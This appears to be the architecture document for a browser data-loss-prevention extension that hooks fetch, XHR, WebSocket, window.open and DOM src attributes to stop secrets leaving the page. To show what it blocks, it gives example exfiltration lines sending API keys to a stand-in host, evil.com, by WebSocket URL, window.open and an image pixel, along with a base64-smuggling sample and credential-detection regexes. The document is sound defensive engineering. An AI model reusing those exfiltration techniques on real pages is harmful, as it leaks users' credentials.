# Kasbah Guard — Technical Architecture

> Version 3.0 "13-Moat" | Last updated Feb 27, 2026

---

## Overview

Kasbah Guard is a local-first DLP browser extension. All detection runs in the browser in under 2ms. No data ever leaves the device. No account required for core protection.

```
User action / Page JS
       │
       ▼
┌─────────────────────────────────────────────────────┐
│              Chrome Extension (MAIN world)           │
│                                                     │
│  ┌────────────────┐    ┌────────────────────────┐   │
│  │  LAYER 1       │    │  LAYER 2               │   │
│  │  Sovereign     │    │  Network Egress Gate   │   │
│  │  Intent Layer  │    │                        │   │
│  │                │    │  fetch · XHR · beacon  │   │
│  │  SEND · PASTE  │    │  WebSocket · form      │   │
│  │  UPLOAD · EDIT │    │  window.open           │   │
│  │  BROWSE · DL   │    │  <img>/<script> src    │   │
│  └───────┬────────┘    └──────────┬─────────────┘   │
│          │                        │                  │
│          └──────────┬─────────────┘                  │
│                     ▼                                │
│           ┌──────────────────┐                       │
│           │   detector.js    │                       │
│           │  Shannon entropy │                       │
│           │  22 regex types  │                       │
│           │  Unicode norm    │                       │
│           │  <2ms local      │                       │
│           └──────────────────┘                       │
└─────────────────────────────────────────────────────┘
       │
       ▼
  ALLOW / WARN / DENY
  (silent / toast / modal)
```

---

## The 13 Moats

These are the technical properties that make Kasbah Guard's protection both deep and hard to replicate. Each moat is a specific code decision with a specific competitive consequence.

### MOAT 1 — `document_start` + `world: MAIN`
**File:** `manifest.json`

```json
{
  "content_scripts": [{
    "run_at": "document_start",
    "world": "MAIN"
  }]
}
```

The extension runs **before the first line of any page script executes**. By the time `<script>` tags load, our hooks are already frozen onto `window.fetch`, `XMLHttpRequest.prototype`, and `WebSocket.prototype`. A page cannot race us.

`world: MAIN` means the extension code runs in the page's own JavaScript context (not the isolated sandbox). This is required to wrap the actual `window.fetch` that the page calls — wrapping it in an isolated world does nothing.

---

### MOAT 2 — 5-API Network Egress Hooks
**File:** `extensions/chrome/src/content.js` (top IIFE)

Every programmatic network exit is covered:

| API | Hook point | What it catches |
|-----|-----------|-----------------|
| `fetch()` | `window.fetch` wrapper | All modern AJAX |
| `XMLHttpRequest` | `.open()` + `.send()` | Legacy AJAX, `open()` tracks URL |
| `navigator.sendBeacon()` | Direct replacement | Fire-and-forget beacons (fires on tab close) |
| `WebSocket.prototype.send()` | Prototype override | Live streams, chat sockets |
| `HTMLFormElement.prototype.submit()` | Prototype override | Programmatic submits (don't fire submit event) |
| `submit` event listener | `capture: true` | Keyboard-triggered form submits |

---

### MOAT 3 — Frozen Hooks (`Object.defineProperty`)
**File:** `content.js` — `_lock()` function

```javascript
function _lock(obj, prop, fn) {
  Object.defineProperty(obj, prop, {
    value: fn,
    writable: false,
    configurable: false
  });
}
_lock(window, 'fetch', _hFetch);
// ... all 8 hooks locked
```

Once installed, these hooks **cannot be overwritten** by page JavaScript. Any attempt to do `window.fetch = originalFetch` silently fails (throws TypeError in strict mode). This closes the obvious bypass: "just reassign the API before calling it."

---

### MOAT 4 — Self-Healing (`setInterval`)
**File:** `content.js` — bottom of egress gate IIFE

```javascript
setInterval(() => {
  if (window.fetch !== _hFetch)
    _lock(window, 'fetch', _hFetch);
  // ... check all 8 hooks every 3 seconds
}, 3000);
```

Every 3 seconds, the gate audits itself. If any hook was somehow replaced (edge case: defineProperty failing on a browser fork, or a race on a very slow load), it reinstalls. The gate heals itself continuously.

---

### MOAT 5 — Inline Fallback Detection (Never Fails Open)
**File:** `content.js` — `_FALLBACK` array + `_isDeny()`

```javascript
const _FALLBACK = [
  /sk-[A-Za-z0-9\-_]{20,}/,     // OpenAI keys
  /gh[poshru]_[A-Za-z0-9_]{36,}/, // GitHub PATs
  /AKIA[0-9A-Z]{16}/,             // AWS keys
  /-----BEGIN [A-Z ]*PRIVATE KEY-----/, // PEM
  // ... CC, SSN, JWT, Slack
];

function _isDeny(str) {
  try { if (getDecision(str) === DENY) return true; } catch {}
  return _fallbackDeny(str); // ← never fails open
}
```

This was the **root cause of all 15 gauntlet vectors leaking** in v2.x. `getDecision()` (from `detector.js`) was silently throwing due to `world: MAIN` timing nuances, and the `catch { return false }` pattern made every check pass clean. The inline fallback patterns ensure the gate has teeth **regardless of whether the full detection engine initializes correctly**.

---

### MOAT 6 — WebSocket Constructor Scan
**File:** `content.js` — `_hWsCtor`

```javascript
function _hWsCtor(url, protocols) {
  if (scanUrl(url)) block("ws:url");
  return protocols !== undefined
    ? new _origWsCtor(url, protocols)
    : new _origWsCtor(url);
}
_hWsCtor.prototype = _origWsCtor.prototype;
_lock(window, 'WebSocket', _hWsCtor);
```

`WebSocket.prototype.send` only catches data sent after connection. This moat catches `new WebSocket("wss://evil.com?key=sk-proj-...")` — exfiltration encoded in the **connection URL itself** before any `.send()` call.

---

### MOAT 7 — `window.open()` Scan
**File:** `content.js` — `_hOpen`

Catches navigation-based exfiltration: `window.open("https://evil.com?secret=sk-...")`. Often missed by tools that focus only on network APIs.

---

### MOAT 8 — MutationObserver Src-Attribute Hook
**File:** `content.js` — `_mo` MutationObserver

```javascript
const _mo = new MutationObserver((mutations) => {
  for (const m of mutations) {
    if (m.type === 'childList') {
      for (const node of m.addedNodes) _checkNode(node);
    } else if (m.type === 'attributes') {
      _checkNode(m.target);
    }
  }
});
_mo.observe(document.documentElement, {
  childList: true, subtree: true,
  attributes: true, attributeFilter: ['src', 'href']
});
```

Catches pixel-based exfiltration:
```javascript
// These bypass fetch/XHR entirely — raw DOM attribute sets
const img = document.createElement('img');
img.src = 'https://evil.com/track.gif?key=sk-proj-...'; // GET request, no fetch()
document.body.appendChild(img);
```
The MutationObserver fires synchronously on attribute change, removes the node before the browser initiates the request.

---

### MOAT 9 — Base64 Decode in Body Scan
**File:** `content.js` — `_scanBase64()`

```javascript
function _scanBase64(str) {
  const segs = str.match(/[A-Za-z0-9+/]{20,}={0,2}/g);
  for (const seg of segs) {
    const dec = atob(seg);
    if (_fallbackDeny(dec)) return true;
  }
}
```

Catches obfuscated exfil:
```json
{"data": "c2stcHJvai0xMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=",
 "encoding": "base64"}
```
Without this, the body looks like random characters and passes detection.

---

### MOAT 10 — Shannon Entropy + 22-Pattern Detection Engine
**File:** `detector.js`

Three-tier detection:

**Tier 1 — Structured regex (DENY, score 70-90):**
Credit cards (Luhn groups), SSN (with invalid prefix exclusions), GitHub PATs, AWS access keys, PEM private keys, OpenAI `sk-` keys, bearer tokens

**Tier 2 — High-risk credentials (WARN/DENY, score 40-75):**
API key assignments, DB connection strings, JWTs, password assignments, environment secrets, SSH credentials

**Tier 3 — Behavioral/entropy signals (additive):**
Shannon entropy calculation, base64 run detection (40+ char runs), suspicious ngram scoring, keyword density, mixed-case + digit ratio

All patterns run on **two text layers**: `tn` (zero-width chars stripped, tabs normalized) and `tc` (fully compact, newlines removed) — catches split-token bypass attempts.

---

### MOAT 11 — Unicode Normalization + Zero-Width Strip
**File:** `detector.js` — text normalization

```javascript
const tn = t
  .replace(/[\u200b-\u200d\ufeff\u00ad\u2060-\u206f]/g, '') // zero-width chars
  .replace(/\t/g, ' ');
const tc = tn.replace(/[\n\r]+/g, '');
```

Catches bypass attempts like:
- `sk-​proj-` (zero-width space between `sk-` and `proj`)
- Keys split across newlines in multi-line pastes
- Unicode confusable characters

---

### MOAT 12 — `<all_urls>` Omnipresent Coverage
**File:** `manifest.json`

```json
"host_permissions": ["<all_urls>"],
"content_scripts": [{ "matches": ["<all_urls>"] }]
```

The extension protects every website the user visits — not just the 6 AI sites we initially listed. Secrets get pasted into CRMs, email drafts, Notion, random SaaS forms — not just ChatGPT. This was the **reason the first gauntlet test appeared to pass**: localhost was not in host_permissions so the extension never injected at all.

---

### MOAT 13 — Zero-Latency Local Detection
**Architectural**

The detection engine is a self-contained JavaScript file (`detector.js`, ~200 lines) that runs synchronously in the browser. No network request, no WebAssembly load, no worker. Decision latency: **< 2ms** (was ~100ms when calling the local Rust daemon over HTTP). Works on airplane mode. Works with the API server down. Zero external dependencies.

---

## Detection Engine Reference

### `classify(text)` — return value

```typescript
{
  risk: number,       // 0-100
  decision: string,   // "ALLOW" | "WARN" | "DENY"
  reason: string,     // e.g. "OpenAI API key; high-entropy base64"
  content_hash: string // hex, for audit trail deduplication
}
```

### Decision thresholds

| Score | Decision | UI behavior |
|-------|----------|-------------|
| 0–39 | ALLOW | Silent pass |
| 40–69 | WARN | Toast (bottom-right, 4s, action proceeds) |
| 70–100 | DENY | Modal (blocking, user must choose) |

### Pattern scoring table (key entries)

| Pattern | Score | Tier |
|---------|-------|------|
| Private key (`-----BEGIN ... PRIVATE KEY`) | +90 | 1 |
| AWS access key (`AKIA...`) | +80 | 1 |
| GitHub PAT (`ghp_...`) | +80 | 1 |
| Credit card number | +80 | 1 |
| SSN (`xxx-xx-xxxx`) | +80 | 1 |
| OpenAI key (`sk-...`) | +70 | 1 |
| DB connection string | +75 | 2 |
| Bearer token | +45 | 2 |
| Password assignment | +45 | 2 |
| Social security reference | +50 | 2 |
| Prompt injection keyword | +50 | 3 |
| High-entropy base64 run | +45 | 3 |
| Suspicious keyword ngrams | +20 | 3 |

---

## Egress Gate — Full API Coverage Map

```
Page JavaScript                    Kasbah hooks at
──────────────────────────────────────────────────
fetch(url, {body})          →  window.fetch wrapper
new XMLHttpRequest()        →  XHR.open() + XHR.send()
navigator.sendBeacon(url)   →  navigator.sendBeacon wrapper
new WebSocket(url)          →  window.WebSocket constructor
ws.send(data)               →  WebSocket.prototype.send
form.submit()               →  HTMLFormElement.prototype.submit
<form> + Enter key          →  submit event (capture phase)
window.open(url)            →  window.open wrapper
<img src="...">             →  MutationObserver (childList + attributes)
<script src="...">          →  MutationObserver (childList + attributes)
<iframe src="...">          →  MutationObserver (childList + attributes)
```

---

## File Reference

| File | Purpose |
|------|---------|
| `extensions/chrome/manifest.json` | MV3 manifest — permissions, content scripts, world/timing |
| `extensions/chrome/src/detector.js` | Self-contained detection engine |
| `extensions/chrome/src/content.js` | Layer 1 (Sovereign Intent) + Layer 2 (Egress Gate) |
| `extensions/chrome/src/styles.css` | Toast + modal CSS |
| `extensions/chrome/popup.html` | Extension popup UI |
| `extensions/chrome/background.js` | Service worker (minimal) |
| `fixtures/gauntlet.html` | 15-vector attack page for stress testing |
| `gauntlet_server.js` | Local HTTP+WS capture server for gauntlet |

---

## Constants

| Constant | Value | Notes |
|----------|-------|-------|
| Extension ID | `idikjiajiomhekkkpfkhnpfepfgknokc` | Chrome Web Store |
| Chrome Store URL | `https://chromewebstore.google.com/detail/kasbah-guard/idikjiajiomhekkkpfkhnpfepfgknokc` | |
| Gauntlet server port | `:8789` | localhost only |
| Desktop app port | `:8788` | Deprecated — extension is now standalone |
| Toast duration | 4000ms error / 4500ms warning | |
| Toast z-index | `2147483646` | Max - 1 |
| Modal z-index | `2147483647` | Max |
| Self-heal interval | 3000ms | |
| Max composer scan | 6000 chars | |
| Max upload scan | 500 KB | |
